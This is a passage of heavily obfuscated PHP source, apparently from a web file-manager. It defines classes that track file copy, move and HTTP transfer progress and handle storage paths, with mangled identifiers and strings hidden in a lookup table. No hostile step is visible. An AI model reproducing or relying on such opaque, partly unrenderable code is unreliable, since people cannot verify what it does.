!1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($°ˆºÅ²œ) { $Àš™¼‹ì =& $_SERVER[Ü©»’·]; Cache::set($Àš™¼‹ì[1689] . $this->task[$Àš™¼‹ì[408]], $°ˆºÅ²œ, 60); return $°ˆºÅ²œ; } public static function get($’¹¢Ê›å) { $“½¿ÜÙŠ =& $_SERVER[Ü©»’·]; $›ÑÁË– = self::valueGet($’¹¢Ê›å); if (is_array($›ÑÁË–) && $›ÑÁË–[$“½¿ÜÙŠ[1693]]) { $¼ŞòÅÏ = ActionApply($›ÑÁË–[$“½¿ÜÙŠ[1693]], array($›ÑÁË–)); $›ÑÁË– = is_array($¼ŞòÅÏ) ? $¼ŞòÅÏ : $›ÑÁË–; } return $›ÑÁË–; } public static function listData() { $‡Î ªÒé = self::valueGet(); return array_sort_by($‡Î ªÒé, $_SERVER[Ü©»’·][1673], !0); } public static function kill($Õ‘éÑŞ‚) { return self::changeStatus($Õ‘éÑŞ‚, self::STATYS_KILL); } public static function stop($Ìå¿æù) { return self::changeStatus($Ìå¿æù, self::STATYS_STOP); } public static function restart($ø–èúéº) { return self::changeStatus($ø–èúéº, self::STATYS_RUNNING); } public static function killAll() { $İØèÀá± =& $_SERVER[Ü©»’·]; $èüÏòü = self::listData(); foreach ($èüÏòü as $Ì›“ìÅ) { self::kill($Ì›“ìÅ[$İØèÀá±[408]]); } sleep(2); foreach ($èüÏòü as $Ì›“ìÅ) { self::valueSet($Ì›“ìÅ[$İØèÀá±[408]], !1); } } private static function changeStatus($üùë„Ï¯, $ã”ºĞş») { $®Áâ´† =& $_SERVER[Ü©»’·]; $×°—õòÍ = self::valueGet($üùë„Ï¯); if (!$×°—õòÍ) { return !1; } $×°—õòÍ[$®Áâ´†[756]] = $ã”ºĞş»; self::valueSet($üùë„Ï¯, $×°—õòÍ); self::log($®Áâ´†[1694] . $×°—õòÍ[$®Áâ´†[408]] . $®Áâ´†[1695] . $ã”ºĞş»); return !0; } public static function valueGet($æ—üŒÄÄ = false) { $ı…ÖšÛ¦ =& $_SERVER[Ü©»’·]; $ôÕã¥ = defined($ı…ÖšÛ¦[484]) ? USER_ID : $ı…ÖšÛ¦[197]; if ($æ—üŒÄÄ) { $ë§Ì—ë´ = Model($ı…ÖšÛ¦[456])->where(array($ı…ÖšÛ¦[94] => $æ—üŒÄÄ, $ı…ÖšÛ¦[33] => $ı…ÖšÛ¦[1074]))->find(); return $ë§Ì—ë´ ? json_decode($ë§Ì—ë´[$ı…ÖšÛ¦[383]], !0) : !1; } return self::taskListUser($ôÕã¥); } public static function taskListUser($¼ê¹Éµâ = false) { $—ğè¯Ã¨ =& $_SERVER[Ü©»’·]; $Ì¡ñÔºç = array($—ğè¯Ã¨[33] => $—ğè¯Ã¨[1074]); if ($¼ê¹Éµâ) { $Ì¡ñÔºç[$—ğè¯Ã¨[1669]] = $¼ê¹Éµâ; } $àÍ¶û¿ = Model($—ğè¯Ã¨[456])->where($Ì¡ñÔºç)->select(); $àÍ¶û¿ = $àÍ¶û¿ ? $àÍ¶û¿ : array(); foreach ($àÍ¶û¿ as $‚Ñ»È¥ğ => $¸ùîÇË¡) { $àÍ¶û¿[$‚Ñ»È¥ğ] = json_decode($¸ùîÇË¡[$—ğè¯Ã¨[383]], !0); } return $àÍ¶û¿; } public static function valueSet($±ë ™¨ò, $µ«ãù¨¥) { $èÄ¥âƒ¾ =& $_SERVER[Ü©»’·]; if (!$µ«ãù¨¥) { return Model($èÄ¥âƒ¾[456])->where(array($èÄ¥âƒ¾[94] => $±ë ™¨ò, $èÄ¥âƒ¾[33] => $èÄ¥âƒ¾[1074]))->delete(); } $ûÑĞî¼î = json_encode($µ«ãù¨¥); if (!$ûÑĞî¼î) { ob_start(); var_dump($µ«ãù¨¥); $÷ãç³šœ = ob_get_clean(); self::log($èÄ¥âƒ¾[1696] . json_encode_force($÷ãç³šœ)); } if (!$±ë ™¨ò || !$µ«ãù¨¥[$èÄ¥âƒ¾[408]]) { return !1; } $­É”Šşü = defined($èÄ¥âƒ¾[484]) ? USER_ID : $èÄ¥âƒ¾[197]; $šÅñº£ = array($èÄ¥âƒ¾[33] => $èÄ¥âƒ¾[1074], $èÄ¥âƒ¾[1669] => $­É”Šşü, $èÄ¥âƒ¾[94] => $±ë ™¨ò, $èÄ¥âƒ¾[383] => $ûÑĞî¼î); $“Éş‚ë¸ = $èÄ¥âƒ¾[1697]; CacheLock::lock($“Éş‚ë¸); Model($èÄ¥âƒ¾[456])->add($šÅñº£, array(), !0); CacheLock::unlock($“Éş‚ë¸); } public static function log($¯Ì§®Ğ) { if (!GLOBAL_DEBUG) { return; } write_log($¯Ì§®Ğ, $_SERVER[Ü©»’·][1698]); } } class TaskFileTransfer extends Task { protected function startAfter() { $§’‰Èİ =& $_SERVER[Ü©»’·]; $À°¨§ö× =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($§’‰Èİ[1699], array($this, $§’‰Èİ[1700])); Hook::bind($§’‰Èİ[1227], array($this, $§’‰Èİ[1701])); Hook::bind($§’‰Èİ[1702], array($this, $§’‰Èİ[1703])); Hook::bind($§’‰Èİ[613], array($this, $§’‰Èİ[1704])); Hook::bind($§’‰Èİ[614], array($this, $§’‰Èİ[1705])); Hook::bind($§’‰Èİ[619], array($this, $§’‰Èİ[1706])); Hook::bind($§’‰Èİ[620], array($this, $§’‰Èİ[1707])); Hook::bind($§’‰Èİ[616], array($this, $§’‰Èİ[1708])); Hook::bind($§’‰Èİ[617], array($this, $§’‰Èİ[1709])); Hook::bind($§’‰Èİ[583], array($this, $§’‰Èİ[1710])); Hook::bind($§’‰Èİ[580], array($this, $§’‰Èİ[1710])); Hook::bind($§’‰Èİ[585], array($this, $§’‰Èİ[1710])); Hook::bind($§’‰Èİ[587], array($this, $§’‰Èİ[1710])); Hook::bind($§’‰Èİ[589], array($this, $§’‰Èİ[1710])); Hook::bind($§’‰Èİ[1711], array($this, $§’‰Èİ[1712])); Hook::bind($§’‰Èİ[606], array($this, $§’‰Èİ[1713])); $this->sourceModelCopyFlag = !1; Hook::bind($§’‰Èİ[1714], array($this, $§’‰Èİ[1715])); Hook::bind($§’‰Èİ[1716], array($this, $§’‰Èİ[1717])); Hook::bind($§’‰Èİ[1718], array($this, $§’‰Èİ[1719])); $À°¨§ö×[$§’‰Èİ[1720]] = LNG($§’‰Èİ[1721]); $À°¨§ö×[$§’‰Èİ[1722]] = 0; $À°¨§ö×[$§’‰Èİ[1723]] = 0; $À°¨§ö×[$§’‰Èİ[1067]] = $§’‰Èİ[12]; $À°¨§ö×[$§’‰Èİ[1724]] = $§’‰Èİ[12]; $À°¨§ö×[$§’‰Èİ[1725]] = 0; $À°¨§ö×[$§’‰Èİ[1726]] = 0; $À°¨§ö×[$§’‰Èİ[1727]] = 0; if (!$À°¨§ö×[$§’‰Èİ[1567]]) { $À°¨§ö×[$§’‰Èİ[1567]] = LNG($§’‰Èİ[1728]); } } protected function endAfter() { $Ô˜À„”ó =& $_SERVER[Ü©»’·]; Hook::unbind($Ô˜À„”ó[1699], array($this, $Ô˜À„”ó[1700])); Hook::unbind($Ô˜À„”ó[1227], array($this, $Ô˜À„”ó[1701])); Hook::unbind($Ô˜À„”ó[1702], array($this, $Ô˜À„”ó[1703])); Hook::unbind($Ô˜À„”ó[613], array($this, $Ô˜À„”ó[1704])); Hook::unbind($Ô˜À„”ó[614], array($this, $Ô˜À„”ó[1705])); Hook::unbind($Ô˜À„”ó[619], array($this, $Ô˜À„”ó[1706])); Hook::unbind($Ô˜À„”ó[620], array($this, $Ô˜À„”ó[1707])); Hook::unbind($Ô˜À„”ó[616], array($this, $Ô˜À„”ó[1708])); Hook::unbind($Ô˜À„”ó[617], array($this, $Ô˜À„”ó[1709])); Hook::unbind($Ô˜À„”ó[583], array($this, $Ô˜À„”ó[1710])); Hook::unbind($Ô˜À„”ó[580], array($this, $Ô˜À„”ó[1710])); Hook::unbind($Ô˜À„”ó[585], array($this, $Ô˜À„”ó[1710])); Hook::unbind($Ô˜À„”ó[587], array($this, $Ô˜À„”ó[1710])); Hook::unbind($Ô˜À„”ó[589], array($this, $Ô˜À„”ó[1710])); Hook::unbind($Ô˜À„”ó[1711], array($this, $Ô˜À„”ó[1712])); Hook::unbind($Ô˜À„”ó[606], array($this, $Ô˜À„”ó[1713])); Hook::unbind($Ô˜À„”ó[1714], array($this, $Ô˜À„”ó[1715])); Hook::unbind($Ô˜À„”ó[1716], array($this, $Ô˜À„”ó[1717])); Hook::unbind($Ô˜À„”ó[1718], array($this, $Ô˜À„”ó[1719])); } public function copyMoveStart($–„Ç¿•¾, $ì½ê¼’¢, $´¼Â–¶ƒ, $œ§Ì¬) { $›‘Ë†ıÉ =& $_SERVER[Ü©»’·]; self::log($›‘Ë†ıÉ[1729] . $ì½ê¼’¢ . $›‘Ë†ıÉ[70] . $œ§Ì¬); $İ½Ë¥Ëº = rtrim(TEMP_FILES, $›‘Ë†ıÉ[8]); if (substr($ì½ê¼’¢, 0, strlen($İ½Ë¥Ëº)) == $İ½Ë¥Ëº) { return; } if (substr($œ§Ì¬, 0, strlen($İ½Ë¥Ëº)) == $İ½Ë¥Ëº) { return; } $’¢­Òù =& $this->task; $’¢­Òù[$›‘Ë†ıÉ[1730]] = KodIO::transferType($–„Ç¿•¾, $´¼Â–¶ƒ); $this->update(); } public function updateAfter() { $ÓÈĞ¥•¤ =& $_SERVER[Ü©»’·]; $Õ¯‹®«¯ =& $this->task; if (!$Õ¯‹®«¯[$ÓÈĞ¥•¤[769]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($Õ¯‹®«¯[$ÓÈĞ¥•¤[1730]] == $ÓÈĞ¥•¤[1316]) { return; } self::updateTask($Õ¯‹®«¯); } private static function updateTask(&$áÔåî§Æ) { $¹î¨ø¹» =& $_SERVER[Ü©»’·]; if ($áÔåî§Æ[$¹î¨ø¹»[1730]] == $¹î¨ø¹»[1198] || $áÔåî§Æ[$¹î¨ø¹»[1730]] == $¹î¨ø¹»[107]) { if ($áÔåî§Æ[$¹î¨ø¹»[1724]]) { $áÔåî§Æ[$¹î¨ø¹»[1727]] = $áÔåî§Æ[$¹î¨ø¹»[1726]] + $áÔåî§Æ[$¹î¨ø¹»[1723]]; } } else { if ($áÔåî§Æ[$¹î¨ø¹»[1730]] == $¹î¨ø¹»[1317]) { if ($áÔåî§Æ[$¹î¨ø¹»[1724]] == $¹î¨ø¹»[1198]) { $áÔåî§Æ[$¹î¨ø¹»[1727]] = $áÔåî§Æ[$¹î¨ø¹»[1726]] + $áÔåî§Æ[$¹î¨ø¹»[1723]] * 0.5; } else { if ($áÔåî§Æ[$¹î¨ø¹»[1724]] == $¹î¨ø¹»[107]) { $áÔåî§Æ[$¹î¨ø¹»[1727]] = $áÔåî§Æ[$¹î¨ø¹»[1726]] + $áÔåî§Æ[$¹î¨ø¹»[1722]] * 0.5 + $áÔåî§Æ[$¹î¨ø¹»[1723]] * 0.5; } } } } $áÔåî§Æ[$¹î¨ø¹»[1671]] = $áÔåî§Æ[$¹î¨ø¹»[1727]] / $áÔåî§Æ[$¹î¨ø¹»[769]]; if ($áÔåî§Æ[$¹î¨ø¹»[1671]] > 0) { $Ìï‚öó¸ = timeFloat() - $áÔåî§Æ[$¹î¨ø¹»[1673]] - $áÔåî§Æ[$¹î¨ø¹»[1676]]; $áÔåî§Æ[$¹î¨ø¹»[1677]] = $Ìï‚öó¸ * (1 - $áÔåî§Æ[$¹î¨ø¹»[1671]]) / $áÔåî§Æ[$¹î¨ø¹»[1671]]; } } public function addPath($‚¢£äßš) { $Àåº‡àœ =& $_SERVER[Ü©»’·]; if (!$‚¢£äßš) { return; } $ÑøÖ–ğœ =& $this->task; $Òı¿ñÁ£ = IO::infoWithChildren($‚¢£äßš); $Œš€û´ = $ÑøÖ–ğœ[$Àåº‡àœ[1731]] ? $ÑøÖ–ğœ[$Àåº‡àœ[1731]][$Àåº‡àœ[1732]] : 0; $ÑøÖ–ğœ[$Àåº‡àœ[1731]] = array($Àåº‡àœ[1732] => $Œš€û´ + 1, $Àåº‡àœ[429] => $Òı¿ñÁ£[$Àåº‡àœ[32]], $Àåº‡àœ[84] => $Òı¿ñÁ£[$Àåº‡àœ[84]], $Àåº‡àœ[528] => $Òı¿ñÁ£[$Àåº‡àœ[528]] ? $Òı¿ñÁ£[$Àåº‡àœ[528]] : $Òı¿ñÁ£[$Àåº‡àœ[84]]); if ($Òı¿ñÁ£[$Àåº‡àœ[33]] == $Àåº‡àœ[199]) { $ÑøÖ–ğœ[$Àåº‡àœ[792]] += 1; } else { $ÑøÖ–ğœ[$Àåº‡àœ[792]] += $Òı¿ñÁ£[$Àåº‡àœ[79]][$Àåº‡àœ[77]]; if ($Òı¿ñÁ£[$Àåº‡àœ[411]]) { $ÑøÖ–ğœ[$Àåº‡àœ[792]] += $Òı¿ñÁ£[$Àåº‡àœ[79]][$Àåº‡àœ[78]] + 1; } } $ÑøÖ–ğœ[$Àåº‡àœ[769]] += $Òı¿ñÁ£[$Àåº‡àœ[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($‡ƒ³Ş¯¡) { } public function sourceAddHashEnd($å‘çêí­) { } public function sourceAddFileStart($‘Ó’Í’¤) { $ª›­‘ ¼ =& $_SERVER[Ü©»’·]; $ŠúîÏ =& $this->task; $ŠúîÏ[$ª›­‘ ¼[1722]] = $‘Ó’Í’¤[$ª›­‘ ¼[76]]; $ŠúîÏ[$ª›­‘ ¼[1720]] = $‘Ó’Í’¤[$ª›­‘ ¼[32]]; $ŠúîÏ[$ª›­‘ ¼[1067]] = $‘Ó’Í’¤[$ª›­‘ ¼[32]]; $ŠúîÏ[$ª›­‘ ¼[1733]] = $‘Ó’Í’¤[$ª›­‘ ¼[84]]; $this->update(); } public function sourceAddFileEnd($æ£÷êßÂ) { $¨Ûöëù =& $_SERVER[Ü©»’·]; $ù‘¶úşÌ =& $this->task; $ù‘¶úşÌ[$¨Ûöëù[1727]] += $æ£÷êßÂ[$¨Ûöëù[76]]; $ù‘¶úşÌ[$¨Ûöëù[1733]] = $æ£÷êßÂ[$¨Ûöëù[84]]; $this->update(1); } public function copyFileStart($„ºµùØ, $¢•Éùß©, $¯Ù¼ßŒâ, $ÄÄÌë´¨, $üÉÊ±›, $¼¿å×ˆ») { $†‚†ˆˆ÷ =& $_SERVER[Ü©»’·]; $ÌÆª“˜ü = $üÉÊ±›; if ($ÌÆª“˜ü == $GLOBALS[$†‚†ˆˆ÷[1734]]) { $ÌÆª“˜ü = $GLOBALS[$†‚†ˆˆ÷[1735]]; } $GLOBALS[$†‚†ˆˆ÷[1735]] = $üÉÊ±›; $GLOBALS[$†‚†ˆˆ÷[1734]] = $¼¿å×ˆ»; $ØÅÜ Æ¼ =& $this->task; $ØÅÜ Æ¼[$†‚†ˆˆ÷[1720]] = $ÌÆª“˜ü; $ØÅÜ Æ¼[$†‚†ˆˆ÷[1722]] = (int) $„ºµùØ->size($¢•Éùß©); $ØÅÜ Æ¼[$†‚†ˆˆ÷[1723]] = 0; $ØÅÜ Æ¼[$†‚†ˆˆ÷[1067]] = $†‚†ˆˆ÷[12]; $ØÅÜ Æ¼[$†‚†ˆˆ÷[1724]] = $†‚†ˆˆ÷[12]; $ØÅÜ Æ¼[$†‚†ˆˆ÷[1725]] = 0; $«çÂÁÈÍ = $ØÅÜ Æ¼[$†‚†ˆˆ÷[1722]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ØÅÜ Æ¼[$†‚†ˆˆ÷[408]] . $†‚†ˆˆ÷[1736]); if ($«çÂÁÈÍ && file_exists(get_path_father($ÄÄÌë´¨))) { Cache::set($ØÅÜ Æ¼[$†‚†ˆˆ÷[408]] . $†‚†ˆˆ÷[1736], $ÄÄÌë´¨); $ØÅÜ Æ¼[$†‚†ˆˆ÷[1693]] = array($†‚†ˆˆ÷[1737], $†‚†ˆˆ÷[1738]); } $this->update(0, $«çÂÁÈÍ); } public static function updateCopyLocalFileSize($é–Šé) { $°„Ğ¥‰ =& $_SERVER[Ü©»’·]; $Êç½“ÌÁ = Cache::get($é–Šé[$°„Ğ¥‰[408]] . $°„Ğ¥‰[1736]); if (!$Êç½“ÌÁ || !file_exists($Êç½“ÌÁ)) { return $é–Šé; } $é–Šé[$°„Ğ¥‰[1723]] = @filesize($Êç½“ÌÁ); $é–Šé[$°„Ğ¥‰[1727]] += $é–Šé[$°„Ğ¥‰[1723]]; self::updateTask($é–Šé); return $é–Šé; } public function copyFileEnd($¯ÜûÄ, $„Ä‘²Ä, $†Ö¢Ñë, $àæÍµÖ, $¿£ôî, $ê–ª¶) { $éËÀ‹ Ö =& $_SERVER[Ü©»’·]; $“Õı½‹ =& $this->task; $“Õı½‹[$éËÀ‹ Ö[1723]] = $“Õı½‹[$éËÀ‹ Ö[1722]]; $“Õı½‹[$éËÀ‹ Ö[1724]] = $éËÀ‹ Ö[12]; unset($“Õı½‹[$éËÀ‹ Ö[1693]]); if ($¿£ôî == $“Õı½‹[$éËÀ‹ Ö[1720]]) { $“Õı½‹[$éËÀ‹ Ö[1726]] += $“Õı½‹[$éËÀ‹ Ö[1722]]; $“Õı½‹[$éËÀ‹ Ö[1727]] = $“Õı½‹[$éËÀ‹ Ö[1726]]; $Å¼çÅŒù = 1; if (isset($“Õı½‹[$éËÀ‹ Ö[1733]]) && $“Õı½‹[$éËÀ‹ Ö[1733]] == $„Ä‘²Ä) { $Å¼çÅŒù = 0; } $this->update($Å¼çÅŒù); } else { $this->update(); $“Õı½‹[$éËÀ‹ Ö[1723]] = 0; } Cache::remove($“Õı½‹[$éËÀ‹ Ö[408]] . $éËÀ‹ Ö[1736]); self::log($éËÀ‹ Ö[1739] . $„Ä‘²Ä . $éËÀ‹ Ö[70] . $àæÍµÖ . $éËÀ‹ Ö[231] . $¿£ôî . $éËÀ‹ Ö[1740] . $“Õı½‹[$éËÀ‹ Ö[1720]]); } public function updateFileEnd($¢­Ö­·, $¬¬ÊÌÂ) { $ï¶Šı˜· =& $_SERVER[Ü©»’·]; $†’áñë§ =& $this->task; $†’áñë§[$ï¶Šı˜·[1720]] = $¢­Ö­·; $†’áñë§[$ï¶Šı˜·[1722]] = $¬¬ÊÌÂ; $†’áñë§[$ï¶Šı˜·[1726]] += $¬¬ÊÌÂ; $†’áñë§[$ï¶Šı˜·[1727]] = $†’áñë§[$ï¶Šı˜·[1726]]; $this->update(1); self::log($ï¶Šı˜·[1741] . $¢­Ö­·); } public function sourceModelCopy($¤Ğä×û¯) { $‘Â¼çÊÌ =& $_SERVER[Ü©»’·]; $•˜Ô‚Šì = $¤Ğä×û¯[0]; $â¨›”èê = $¤Ğä×û¯[1]; $àñÕúŞí =& $this->task; $this->sourceModelCopyFlag = !0; $ÂÑ™´ö¹ = 0; switch ($•˜Ô‚Šì) { case $‘Â¼çÊÌ[581]: $ÂÑ™´ö¹ = 1; break; case $‘Â¼çÊÌ[584]: $àñÕúŞí[$‘Â¼çÊÌ[1720]] = $â¨›”èê[$‘Â¼çÊÌ[32]]; break; case $‘Â¼çÊÌ[586]: $ÂÑ™´ö¹ = intval($¤Ğä×û¯[$‘Â¼çÊÌ[389]] * 0.4); break; case $‘Â¼çÊÌ[588]: $ÂÑ™´ö¹ = intval($¤Ğä×û¯[$‘Â¼çÊÌ[389]] * 0.2); break; case $‘Â¼çÊÌ[590]: $ÂÑ™´ö¹ = intval($¤Ğä×û¯[$‘Â¼çÊÌ[389]] * 0.4); break; } $this->update($ÂÑ™´ö¹); $this->sourceModelCopyFlag = !1; } public function sourceRemove($¹È÷Î–Ñ, $ô’é¬ì÷) { $Û¬³­‡Ë =& $_SERVER[Ü©»’·]; $this->sourceModelCopyFlag = !0; $ñ¸üì‰À = 1; if (isset($¹È÷Î–Ñ[$Û¬³­‡Ë[79]])) { $ñ¸üì‰À = $¹È÷Î–Ñ[$Û¬³­‡Ë[79]][$Û¬³­‡Ë[77]]; $ñ¸üì‰À = $ñ¸üì‰À + $¹È÷Î–Ñ[$Û¬³­‡Ë[79]][$Û¬³­‡Ë[78]] + 1; } $this->update($ñ¸üì‰À); $this->sourceModelCopyFlag = !1; } public function sourceMove($è„¤Ùâï) { $this->sourceRemove($è„¤Ùâï, !1); } public function curlProgress($©¹·Ã”Ü, $ŸÇÏ£“ë, $€ó¢ö­½, $ÎÙ£ßˆû, $­ê´½‚) { $å­·Ç¨Š =& $_SERVER[Ü©»’·]; $ï£Û¥Ãû =& $this->task; if ($­ê´½‚ > 0) { $ï£Û¥Ãû[$å­·Ç¨Š[1067]] = $å­·Ç¨Š[1742]; $ï£Û¥Ãû[$å­·Ç¨Š[1724]] = $å­·Ç¨Š[107]; if ($ï£Û¥Ãû[$å­·Ç¨Š[1722]]) { $ï£Û¥Ãû[$å­·Ç¨Š[1723]] = $­ê´½‚; } if ($ï£Û¥Ãû[$å­·Ç¨Š[1725]]) { $ï£Û¥Ãû[$å­·Ç¨Š[1723]] = $­ê´½‚ + $ï£Û¥Ãû[$å­·Ç¨Š[1725]]; } } else { if ($€ó¢ö­½ > 0) { if ($ï£Û¥Ãû[$å­·Ç¨Š[1722]] == $ŸÇÏ£“ë) { $ï£Û¥Ãû[$å­·Ç¨Š[1723]] = $€ó¢ö­½; $ï£Û¥Ãû[$å­·Ç¨Š[1067]] = $å­·Ç¨Š[1743]; $ï£Û¥Ãû[$å­·Ç¨Š[1724]] = $å­·Ç¨Š[1198]; } } } $this->update(); } public function curlProgressStart($Øêñœ’ã) { } public function curlProgressEnd($à¨Ô¨Óã) { $²†™À×² =& $_SERVER[Ü©»’·]; $Õ™úÑèµ =& $this->task; $²ìØÚ¼ = curl_getinfo($à¨Ô¨Óã); $û÷é¶§¬ = $²ìØÚ¼[$²†™À×²[1744]]; if ($û÷é¶§¬ == -1) { $û÷é¶§¬ = $²ìØÚ¼[$²†™À×²[1745]]; } if ($Õ™úÑèµ[$²†™À×²[1724]] == $²†™À×²[107] && $û÷é¶§¬) { $Õ™úÑèµ[$²†™À×²[1725]] += $û÷é¶§¬; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $­³êŒë› =& $_SERVER[Ü©»’·]; $æ ¸ò  =& $this->task; $æ ¸ò [$­³êŒë›[1746]] = 1; Hook::bind($­³êŒë›[1714], array($this, $­³êŒë›[1747])); Hook::bind($­³êŒë›[1716], array($this, $­³êŒë›[1748])); Hook::bind($­³êŒë›[1718], array($this, $­³êŒë›[1749])); } protected function endAfter() { $«Ğ›§Ì =& $_SERVER[Ü©»’·]; Hook::unbind($«Ğ›§Ì[1714], array($this, $«Ğ›§Ì[1747])); Hook::unbind($«Ğ›§Ì[1716], array($this, $«Ğ›§Ì[1748])); Hook::unbind($«Ğ›§Ì[1718], array($this, $«Ğ›§Ì[1749])); } public function progressStart($ì’ª‰Ÿ») { $å¸áêÜ =& $_SERVER[Ü©»’·]; $ğÔüô»Â = curl_getinfo($ì’ª‰Ÿ»); self::log($å¸áêÜ[1750] . $ğÔüô»Â[$å¸áêÜ[307]]); self::valueSet($this->task[$å¸áêÜ[408]], $this->task); } public function progressEnd($¢“ùéÄ„) { $·¥ÏÄ =& $_SERVER[Ü©»’·]; self::log($·¥ÏÄ[1751] . $this->task[$·¥ÏÄ[408]]); $this->end(); } public function progress($¼ˆÜôË, $¡ùÎ°¥±, $¬–ñÒ‡¨, $´õŸóåë, $üš“˜¿ğ) { $½¬ü¼à =& $_SERVER[Ü©»’·]; $ÌÖ¾ñ =& $this->task; if ($üš“˜¿ğ > 0) { $ÌÖ¾ñ[$½¬ü¼à[792]] = $ÌÖ¾ñ[$½¬ü¼à[792]] == 0 ? $´õŸóåë : $ÌÖ¾ñ[$½¬ü¼à[792]]; $ÌÖ¾ñ[$½¬ü¼à[1670]] = $üš“˜¿ğ; } else { if ($¬–ñÒ‡¨ > 0) { $ÌÖ¾ñ[$½¬ü¼à[792]] = $ÌÖ¾ñ[$½¬ü¼à[792]] == 0 ? $¡ùÎ°¥± : $ÌÖ¾ñ[$½¬ü¼à[792]]; $ÌÖ¾ñ[$½¬ü¼à[1670]] = $¬–ñÒ‡¨; } } $this->update(); self::log("\160\x72\x6f\x67\x72\145\163\163\x48\164\164\x70\72\x64\x6f\x77\x6e\72{$¬–ñÒ‡¨}\x2f{$¡ùÎ°¥±}\73\x20\x75\160\154\157\x61\144\x3a{$üš“˜¿ğ}\57{$´õŸóåë}\x3b"); } } goto bƒ›ĞÛÒ‚¦; BË›ŞØà: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $óµõÄ“¦ =& $_SERVER[Ü©»’·]; $this->objectDriver = array($óµõÄ“¦[60], $óµõÄ“¦[61], $óµõÄ“¦[62], $óµõÄ“¦[63], $óµõÄ“¦[64], $óµõÄ“¦[65], $óµõÄ“¦[66], $óµõÄ“¦[67], $óµõÄ“¦[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($óŸé˜¿œ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($óŸé˜¿œ, $_SERVER[Ü©»’·][8]); } return $óŸé˜¿œ; } public function iconvApp($­àƒÊ¿Ç) { return $­àƒÊ¿Ç; } public function iconvSystem($ã—ùí¹) { return $ã—ùí¹; } public function iconvTo($öùéôÊÒ, $‹›¢è¶, $õÜäüöŠ) { $¡Øö›§µ =& $_SERVER[Ü©»’·]; if (!$öùéôÊÒ || !function_exists($¡Øö›§µ[69])) { return $öùéôÊÒ; } static $•†¢ĞÒ” = array(); $ï¾¬Å†« = $‹›¢è¶ . $¡Øö›§µ[70] . $õÜäüöŠ . $¡Øö›§µ[71] . $öùéôÊÒ; if (isset($•†¢ĞÒ”[$ï¾¬Å†«])) { return $•†¢ĞÒ”[$ï¾¬Å†«]; } if (function_exists($¡Øö›§µ[72])) { $®Îšæëä = @mb_convert_encoding($öùéôÊÒ, $õÜäüöŠ, $‹›¢è¶); } else { $®Îšæëä = @iconv($‹›¢è¶, $õÜäüöŠ, $öùéôÊÒ); } $®Îšæëä = $®Îšæëä ? $®Îšæëä : $öùéôÊÒ; if (strstr($®Îšæëä, $¡Øö›§µ[73])) { $®Îšæëä = str_replace($¡Øö›§µ[73], $¡Øö›§µ[11], $®Îšæëä); } $•†¢ĞÒ”[$‹›¢è¶ . $¡Øö›§µ[70] . $õÜäüöŠ . $¡Øö›§µ[71] . $öùéôÊÒ] = $®Îšæëä; $•†¢ĞÒ”[$õÜäüöŠ . $¡Øö›§µ[70] . $‹›¢è¶ . $¡Øö›§µ[71] . $öùéôÊÒ] = $öùéôÊÒ; $•†¢ĞÒ”[$õÜäüöŠ . $¡Øö›§µ[70] . $‹›¢è¶ . $¡Øö›§µ[71] . $®Îšæëä] = $öùéôÊÒ; $•†¢ĞÒ”[$‹›¢è¶ . $¡Øö›§µ[70] . $õÜäüöŠ . $¡Øö›§µ[71] . $®Îšæëä] = $®Îšæëä; return $®Îšæëä; } public function getPathInner($”ÃÍˆ¸Ã) { $ŸüıÌä = IO::init($”ÃÍˆ¸Ã); return $ŸüıÌä->path; } public function getPathOuter($ËÖè÷á ) { $…Âà©‚× =& $_SERVER[Ü©»’·]; $ì§ÈØ»é = strlen(trim($this->pathBase, $…Âà©‚×[8])); $ËÖè÷á  = substr(trim($ËÖè÷á , $…Âà©‚×[8]), $ì§ÈØ»é); return $this->pathDriver . $…Âà©‚×[8] . ltrim($ËÖè÷á , $…Âà©‚×[8]); } public function isParentOf($¨‘ÑŒ˜, $Øìì…İæ) { $»ıÈ©ı¿ =& $_SERVER[Ü©»’·]; $¨‘ÑŒ˜ = rtrim(strtolower($¨‘ÑŒ˜), $»ıÈ©ı¿[8]) . $»ıÈ©ı¿[8]; $Øìì…İæ = rtrim(strtolower($Øìì…İæ), $»ıÈ©ı¿[8]) . $»ıÈ©ı¿[8]; $íî¸’â’ = strpos($Øìì…İæ, $¨‘ÑŒ˜) === 0; return $íî¸’â’; } public function getType() { $Í¹€çÙ =& $_SERVER[Ü©»’·]; $ôÂœ´Èè = str_replace($Í¹€çÙ[74], $Í¹€çÙ[12], get_class($this)); return strtolower($ôÂœ´Èè); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($‰Õ˜ìÔ’, $öÉ£¬÷×) { $…Öª²Ó– =& $_SERVER[Ü©»’·]; $ÅÚ€¦—Ø = rtrim($‰Õ˜ìÔ’, $…Öª²Ó–[8]) . $…Öª²Ó–[8] . $öÉ£¬÷×; $’™Å‹¾£ = $this->exist($ÅÚ€¦—Ø); return $’™Å‹¾£ ? $ÅÚ€¦—Ø : !1; } public function setModifyTime($ßìªÀÉò, $¬‘ß‘›Ü = '') { } public function renameObject($»Ù—‡í, $²†„üÁ°) { $©õˆíï¨ = $²†„üÁ°; $»Ù—‡í = $this->getPathOuter($»Ù—‡í); $²†„üÁ° = $this->pathFather($»Ù—‡í) . $²†„üÁ°; $õšÍšºË = IO::copy($»Ù—‡í, $this->pathFather($»Ù—‡í), REPEAT_RENAME_FOLDER, $©õˆíï¨); if ($õšÍšºË) { IO::remove($»Ù—‡í); } return $õšÍšºË ? $²†„üÁ° : !1; } public function tempFile($º£óØÈ = '', $‰İåìì¦ = '') { if (!$º£óØÈ) { $º£óØÈ = rand_string(15); } $·€„©Ç = TEMP_FILES . rand_string(15) . $_SERVER[Ü©»’·][8]; @mkdir($·€„©Ç, DEFAULT_PERRMISSIONS, !0); $ì‚‘¶ò = $·€„©Ç . 